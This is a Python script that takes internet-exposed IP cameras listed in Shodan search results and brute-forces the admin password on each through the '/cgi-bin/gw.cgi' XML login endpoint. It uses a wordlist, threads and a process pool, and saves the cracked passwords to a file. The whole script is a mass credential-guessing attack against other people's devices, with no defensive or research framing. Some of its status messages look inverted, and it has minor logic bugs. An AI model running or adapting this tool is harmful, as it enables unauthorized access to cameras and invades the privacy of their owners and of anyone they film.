from threading import Thread
import json
import xml.etree.ElementTree as ET
import requests
import numpy as np
import os
from multiprocessing import Pool

url_suffix = "/cgi-bin/gw.cgi"
get_xml_str = '<juan ver="" squ="" dir="0"><rpermission usr="admin" pwd=""><config base=""/><playback ' \
              'base=""/></rpermission></juan>'
head = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/79 Safari/537.36'}
file_path = "shodan_data.json"
f = open('passwords.txt', 'r')
passwords = np.array(f.read().splitlines())
f.close()
invalid_list = list()


class MyThread(Thread):
    def __init__(self, func, args):
        super(MyThread, self).__init__()
        self.func = func
        self.args = args
        self.result = None

    def run(self):
        self.result = self.func(*self.args)

    def get_result(self):
        return self.result


class BreakError(Exception):

    def __init__(self):
        super().__init__()


def acquire_all_cameras():
    with open("shodan_data.json", 'r+') as file:
        lines = file.readlines()
        result = []
        for line in lines:
            data = json.loads(line)
            result.append(data)
        return result


def try_out_passwords(url):
    url = url + url_suffix

    def try_out_single_password(pwd):
        root = ET.fromstring(get_xml_str)
        login = root.find('rpermission')
        login.set('pwd', pwd)
        params = {'xml': ET.tostring(root).decode('utf-8')}
        # noinspection PyBroadException
        try:
            res = requests.get(url=url, params=params, headers=head)
        except Exception:
            return -1
        if res.status_code != 200:
            return -1
        try:
            res_root = ET.fromstring(res.text)
            if res_root.find('rpermission') is None:
                return None
            if res_root.find('rpermission').get('remain') == 0:
                return None
            if res_root.find('rpermission').get('errno') == '0':
                return True
            return False
        except ET.ParseError as e:
            return None

    results = [False] * len(passwords)
    num_threads = 10
    len_passwords = len(passwords)
    num_iterate = len_passwords // num_threads + 1
    try:
        for iterate in range(num_iterate):
            threads = []
            for index in range(iterate * num_threads, min(len_passwords, (iterate + 1) * num_threads)):
                t = MyThread(try_out_single_password, args=(passwords[index],))
                t.setDaemon(True)
                t.start()
                threads.append((t, index))
            for t, index in threads:
                t.join()
                result = t.get_result()
                if result:
                    results[index] = True
                    raise BreakError
                if result is None:
                    raise BreakError
                if result == -1:
                    invalid_list.append(url)
                    raise BreakError
    except BreakError as e:
        pass
    pwd = passwords[results]
    if len(pwd) > 0:
        print("Tested {}: failed".format(url))
        return pwd[0]
    else:
        print("Tested {}: success".format(url))
        return None


if __name__ == "__main__":
    if os.path.exists("addresses.json"):
        addresses = json.load(open("addresses.json"))
    else:
        cameras = acquire_all_cameras()
        addresses = ["http://" + camera['ip_str'] + ":" + str(camera['port']) for camera in cameras]
        with open("addresses.json", 'w+') as addr_file:
            addr_file.write(json.dumps(addresses))
    pool = Pool(6)
    actual_passwords = pool.map(try_out_passwords, addresses)
    pool.close()
    pool.join()

    print(actual_passwords)
    print(invalid_list)

    actual_passwords = np.array(actual_passwords)
    invalid_list = np.array(invalid_list)
    np.save("actual_passwords.npy", actual_passwords)
    np.save("invalid_list.npy", invalid_list)
